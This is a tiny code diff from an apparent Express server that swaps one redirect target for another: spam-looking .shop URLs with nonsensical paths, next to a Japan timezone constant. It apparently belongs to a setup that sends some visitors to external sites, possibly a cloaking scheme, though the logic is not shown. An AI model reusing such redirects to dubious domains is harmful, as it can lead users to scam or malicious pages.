@@ -2,7 +2,7 @@ import express from "express";
 
 const app = express();
 
-const FINAL_REDIRECT_URL = "https://fooidemix.shop/sukiyo/sukiyo/fap";
+const FINAL_REDIRECT_URL = "https://welnessclass.shop/highway/hordy/newiest/ghiosht/fest";
 const JAPAN_TIMEZONE = "Asia/Tokyo";
 
 // ✅ CORS middleware (required for fetch)
